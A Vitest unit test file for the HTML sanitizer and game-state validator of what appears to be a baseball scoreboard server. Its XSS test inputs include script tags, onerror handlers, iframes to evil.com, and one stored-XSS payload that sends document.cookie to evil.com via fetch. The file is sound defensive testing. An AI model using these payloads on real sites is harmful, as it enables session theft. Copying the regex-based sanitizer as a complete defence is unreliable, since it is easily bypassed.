/**
 * Unit tests for validateGameState and sanitizeHTML functions
 * Tests XSS prevention and game state validation
 */

import { describe, it, expect } from 'vitest';

/**
 * Copy of sanitizeHTML function from server.js for testing
 */
function sanitizeHTML(input) {
  if (typeof input !== 'string') {
    return input;
  }

  return input
    // Remove all HTML tags
    .replace(/<[^>]*>/g, '')
    // Decode common HTML entities to prevent double-encoding bypass
    .replace(/&lt;/g, '<')
    .replace(/&gt;/g, '>')
    .replace(/&quot;/g, '"')
    .replace(/&#x27;/g, "'")
    .replace(/&#x2F;/g, '/')
    // Remove the decoded tags (in case of encoded script tags)
    .replace(/<[^>]*>/g, '')
    // Remove any remaining HTML entities
    .replace(/&[a-zA-Z0-9#]+;/g, '')
    // Trim whitespace
    .trim();
}

/**
 * Copy of validateGameState function from server.js for testing
 */
function validateGameState(gameData) {
  try {
    // Check if gameData is an object
    if (typeof gameData !== 'object' || gameData === null || Array.isArray(gameData)) {
      return { valid: false, error: 'Game data must be a non-null object' };
    }

    // Define expected schema with types and constraints
    const schema = {
      game_title: { type: 'string', maxLength: 100 },
      team_top: { type: 'string', maxLength: 50 },
      team_bottom: { type: 'string', maxLength: 50 },
      game_inning: { type: 'number', min: 0, max: 99 },
      top: { type: 'boolean' },
      first_base: { type: 'boolean' },
      second_base: { type: 'boolean' },
      third_base: { type: 'boolean' },
      ball_cnt: { type: 'number', min: 0, max: 3 },
      strike_cnt: { type: 'number', min: 0, max: 2 },
      out_cnt: { type: 'number', min: 0, max: 2 },
      score_top: { type: 'number', min: 0, max: 999 },
      score_bottom: { type: 'number', min: 0, max: 999 },
      last_inning: { type: 'number', min: 1, max: 99 }
    };

    const sanitizedData = {};

    // Validate each field
    for (const [field, rules] of Object.entries(schema)) {
      const value = gameData[field];

      // Check type
      if (rules.type === 'string') {
        if (typeof value !== 'string') {
          return { valid: false, error: `Field '${field}' must be a string` };
        }

        // Check max length
        if (rules.maxLength && value.length > rules.maxLength) {
          return {
            valid: false,
            error: `Field '${field}' exceeds maximum length of ${rules.maxLength}`
          };
        }

        // Sanitize HTML
        sanitizedData[field] = sanitizeHTML(value);

      } else if (rules.type === 'number') {
        if (typeof value !== 'number' || !Number.isFinite(value)) {
          return { valid: false, error: `Field '${field}' must be a finite number` };
        }

        // Check range
        if (rules.min !== undefined && value < rules.min) {
          return {
            valid: false,
            error: `Field '${field}' must be at least ${rules.min}`
          };
        }
        if (rules.max !== undefined && value > rules.max) {
          return {
            valid: false,
            error: `Field '${field}' must be at most ${rules.max}`
          };
        }

        // Round to integer for count fields
        sanitizedData[field] = Math.round(value);

      } else if (rules.type === 'boolean') {
        if (typeof value !== 'boolean') {
          return { valid: false, error: `Field '${field}' must be a boolean` };
        }
        sanitizedData[field] = value;
      }
    }

    // Check for unexpected fields (strict schema enforcement)
    const unexpectedFields = Object.keys(gameData).filter(key => !schema[key]);
    if (unexpectedFields.length > 0) {
      // Don't reject, just ignore unexpected fields for forward compatibility
    }

    return { valid: true, sanitizedData };

  } catch (error) {
    return { valid: false, error: error.message };
  }
}

describe('sanitizeHTML', () => {
  describe('XSS Attack Prevention', () => {
    it('should remove script tags', () => {
      const result = sanitizeHTML('<script>alert("xss")</script>');
      expect(result).toBe('alert("xss")');
    });

    it('should remove script tags with attributes', () => {
      const result = sanitizeHTML('<script src="evil.js">alert("xss")</script>');
      expect(result).toBe('alert("xss")');
    });

    it('should remove inline event handlers', () => {
      const result = sanitizeHTML('<img src="x" onerror="alert(\'xss\')">');
      expect(result).toBe('');
    });

    it('should remove iframe tags', () => {
      const result = sanitizeHTML('<iframe src="evil.com"></iframe>');
      expect(result).toBe('');
    });

    it('should remove all HTML tags', () => {
      const result = sanitizeHTML('<div><p>Text</p></div>');
      expect(result).toBe('Text');
    });

    it('should handle encoded script tags', () => {
      const result = sanitizeHTML('&lt;script&gt;alert("xss")&lt;/script&gt;');
      expect(result).toBe('alert("xss")');
    });

    it('should prevent double-encoding bypass', () => {
      const result = sanitizeHTML('&lt;img src=x onerror=alert(1)&gt;');
      expect(result).toBe('');
    });

    it('should remove HTML entities', () => {
      const result = sanitizeHTML('Hello&nbsp;World&#x27;');
      // &#x27; is decoded to ' (apostrophe), &nbsp; is removed
      expect(result).toBe("HelloWorld'");
    });
  });

  describe('Normal Text Handling', () => {
    it('should preserve normal text', () => {
      const result = sanitizeHTML('Normal text');
      expect(result).toBe('Normal text');
    });

    it('should preserve Japanese text', () => {
      const result = sanitizeHTML('夏季大会');
      expect(result).toBe('夏季大会');
    });

    it('should preserve numbers and symbols', () => {
      const result = sanitizeHTML('Team 123 vs Team 456');
      expect(result).toBe('Team 123 vs Team 456');
    });

    it('should trim whitespace', () => {
      const result = sanitizeHTML('  Text with spaces  ');
      expect(result).toBe('Text with spaces');
    });

    it('should handle empty string', () => {
      const result = sanitizeHTML('');
      expect(result).toBe('');
    });

    it('should handle non-string input', () => {
      const result = sanitizeHTML(123);
      expect(result).toBe(123);
    });
  });
});

describe('validateGameState', () => {
  const validGameState = {
    game_title: '夏季大会',
    team_top: '横浜M',
    team_bottom: '静岡D',
    game_inning: 5,
    top: true,
    first_base: false,
    second_base: true,
    third_base: false,
    ball_cnt: 2,
    strike_cnt: 1,
    out_cnt: 0,
    score_top: 3,
    score_bottom: 2,
    last_inning: 9
  };

  describe('Valid Game States', () => {
    it('should accept valid game state', () => {
      const result = validateGameState(validGameState);
      expect(result.valid).toBe(true);
      expect(result.sanitizedData).toEqual(validGameState);
    });

    it('should accept game state with minimum values', () => {
      const minState = {
        game_title: '',
        team_top: '',
        team_bottom: '',
        game_inning: 0,
        top: false,
        first_base: false,
        second_base: false,
        third_base: false,
        ball_cnt: 0,
        strike_cnt: 0,
        out_cnt: 0,
        score_top: 0,
        score_bottom: 0,
        last_inning: 1
      };
      const result = validateGameState(minState);
      expect(result.valid).toBe(true);
    });

    it('should accept game state with maximum values', () => {
      const maxState = {
        game_title: 'A'.repeat(100),
        team_top: 'B'.repeat(50),
        team_bottom: 'C'.repeat(50),
        game_inning: 99,
        top: true,
        first_base: true,
        second_base: true,
        third_base: true,
        ball_cnt: 3,
        strike_cnt: 2,
        out_cnt: 2,
        score_top: 999,
        score_bottom: 999,
        last_inning: 99
      };
      const result = validateGameState(maxState);
      expect(result.valid).toBe(true);
    });
  });

  describe('XSS Attack Prevention in Game State', () => {
    it('should sanitize script tag in game_title', () => {
      const maliciousState = {
        ...validGameState,
        game_title: '<script>alert("xss")</script>夏季大会'
      };
      const result = validateGameState(maliciousState);
      expect(result.valid).toBe(true);
      expect(result.sanitizedData.game_title).toBe('alert("xss")夏季大会');
    });

    it('should sanitize HTML in team_top', () => {
      const maliciousState = {
        ...validGameState,
        team_top: '<img src=x onerror=alert(1)>横浜M'
      };
      const result = validateGameState(maliciousState);
      expect(result.valid).toBe(true);
      expect(result.sanitizedData.team_top).toBe('横浜M');
    });

    it('should sanitize HTML in team_bottom', () => {
      const maliciousState = {
        ...validGameState,
        team_bottom: '<iframe src="evil.com"></iframe>静岡D'
      };
      const result = validateGameState(maliciousState);
      expect(result.valid).toBe(true);
      expect(result.sanitizedData.team_bottom).toBe('静岡D');
    });

    it('should handle encoded XSS in game_title', () => {
      const maliciousState = {
        ...validGameState,
        game_title: '&lt;script&gt;alert("xss")&lt;/script&gt;'
      };
      const result = validateGameState(maliciousState);
      expect(result.valid).toBe(true);
      expect(result.sanitizedData.game_title).toBe('alert("xss")');
    });
  });

  describe('Type Validation', () => {
    it('should reject non-object input', () => {
      const result = validateGameState('not an object');
      expect(result.valid).toBe(false);
      expect(result.error).toContain('must be a non-null object');
    });

    it('should reject null input', () => {
      const result = validateGameState(null);
      expect(result.valid).toBe(false);
      expect(result.error).toContain('must be a non-null object');
    });

    it('should reject array input', () => {
      const result = validateGameState([1, 2, 3]);
      expect(result.valid).toBe(false);
      expect(result.error).toContain('must be a non-null object');
    });

    it('should reject non-string game_title', () => {
      const result = validateGameState({ ...validGameState, game_title: 123 });
      expect(result.valid).toBe(false);
      expect(result.error).toContain("'game_title' must be a string");
    });

    it('should reject non-number game_inning', () => {
      const result = validateGameState({ ...validGameState, game_inning: '5' });
      expect(result.valid).toBe(false);
      expect(result.error).toContain("'game_inning' must be a finite number");
    });

    it('should reject non-boolean top', () => {
      const result = validateGameState({ ...validGameState, top: 1 });
      expect(result.valid).toBe(false);
      expect(result.error).toContain("'top' must be a boolean");
    });

    it('should reject Infinity', () => {
      const result = validateGameState({ ...validGameState, score_top: Infinity });
      expect(result.valid).toBe(false);
      expect(result.error).toContain("must be a finite number");
    });

    it('should reject NaN', () => {
      const result = validateGameState({ ...validGameState, score_top: NaN });
      expect(result.valid).toBe(false);
      expect(result.error).toContain("must be a finite number");
    });
  });

  describe('Range Validation', () => {
    it('should reject negative ball_cnt', () => {
      const result = validateGameState({ ...validGameState, ball_cnt: -1 });
      expect(result.valid).toBe(false);
      expect(result.error).toContain('must be at least 0');
    });

    it('should reject ball_cnt > 3', () => {
      const result = validateGameState({ ...validGameState, ball_cnt: 4 });
      expect(result.valid).toBe(false);
      expect(result.error).toContain('must be at most 3');
    });

    it('should reject strike_cnt > 2', () => {
      const result = validateGameState({ ...validGameState, strike_cnt: 3 });
      expect(result.valid).toBe(false);
      expect(result.error).toContain('must be at most 2');
    });

    it('should reject out_cnt > 2', () => {
      const result = validateGameState({ ...validGameState, out_cnt: 3 });
      expect(result.valid).toBe(false);
      expect(result.error).toContain('must be at most 2');
    });

    it('should reject score > 999', () => {
      const result = validateGameState({ ...validGameState, score_top: 1000 });
      expect(result.valid).toBe(false);
      expect(result.error).toContain('must be at most 999');
    });

    it('should reject game_inning > 99', () => {
      const result = validateGameState({ ...validGameState, game_inning: 100 });
      expect(result.valid).toBe(false);
      expect(result.error).toContain('must be at most 99');
    });

    it('should reject last_inning < 1', () => {
      const result = validateGameState({ ...validGameState, last_inning: 0 });
      expect(result.valid).toBe(false);
      expect(result.error).toContain('must be at least 1');
    });
  });

  describe('String Length Validation', () => {
    it('should reject game_title longer than 100 characters', () => {
      const result = validateGameState({
        ...validGameState,
        game_title: 'A'.repeat(101)
      });
      expect(result.valid).toBe(false);
      expect(result.error).toContain('exceeds maximum length');
    });

    it('should reject team_top longer than 50 characters', () => {
      const result = validateGameState({
        ...validGameState,
        team_top: 'B'.repeat(51)
      });
      expect(result.valid).toBe(false);
      expect(result.error).toContain('exceeds maximum length');
    });

    it('should reject team_bottom longer than 50 characters', () => {
      const result = validateGameState({
        ...validGameState,
        team_bottom: 'C'.repeat(51)
      });
      expect(result.valid).toBe(false);
      expect(result.error).toContain('exceeds maximum length');
    });
  });

  describe('Number Rounding', () => {
    it('should round floating point numbers', () => {
      const result = validateGameState({
        ...validGameState,
        game_inning: 5.7
      });
      expect(result.valid).toBe(true);
      expect(result.sanitizedData.game_inning).toBe(6);
    });

    it('should round scores', () => {
      const result = validateGameState({
        ...validGameState,
        score_top: 3.4,
        score_bottom: 2.6
      });
      expect(result.valid).toBe(true);
      expect(result.sanitizedData.score_top).toBe(3);
      expect(result.sanitizedData.score_bottom).toBe(3);
    });
  });

  describe('Unexpected Fields', () => {
    it('should ignore unexpected fields', () => {
      const result = validateGameState({
        ...validGameState,
        unexpected_field: 'malicious data',
        another_field: 123
      });
      expect(result.valid).toBe(true);
      expect(result.sanitizedData.unexpected_field).toBeUndefined();
      expect(result.sanitizedData.another_field).toBeUndefined();
    });
  });

  describe('Real-world Attack Scenarios', () => {
    it('should prevent stored XSS via game_title', () => {
      const xssPayload = '<img src=x onerror="fetch(\'http://evil.com?cookie=\'+document.cookie)">';
      const result = validateGameState({
        ...validGameState,
        game_title: xssPayload
      });
      expect(result.valid).toBe(true);
      expect(result.sanitizedData.game_title).not.toContain('<');
      expect(result.sanitizedData.game_title).not.toContain('onerror');
    });

    it('should prevent DOM-based XSS via team names', () => {
      const result = validateGameState({
        ...validGameState,
        team_top: '"><script>alert(document.domain)</script>',
        team_bottom: 'javascript:alert(1)'
      });
      expect(result.valid).toBe(true);
      expect(result.sanitizedData.team_top).not.toContain('<script>');
      expect(result.sanitizedData.team_bottom).toBe('javascript:alert(1)'); // text only, safe
    });

    it('should prevent complex nested XSS', () => {
      const result = validateGameState({
        ...validGameState,
        game_title: '<div><script>alert(1)</script><img src=x onerror=alert(2)></div>'
      });
      expect(result.valid).toBe(true);
      expect(result.sanitizedData.game_title).toBe('alert(1)');
    });
  });

  describe('Performance', () => {
    it('should validate 1000 game states in reasonable time', () => {
      const startTime = Date.now();
      for (let i = 0; i < 1000; i++) {
        validateGameState(validGameState);
      }
      const endTime = Date.now();
      const duration = endTime - startTime;

      expect(duration).toBeLessThan(200); // Should complete in less than 200ms
    });
  });
});
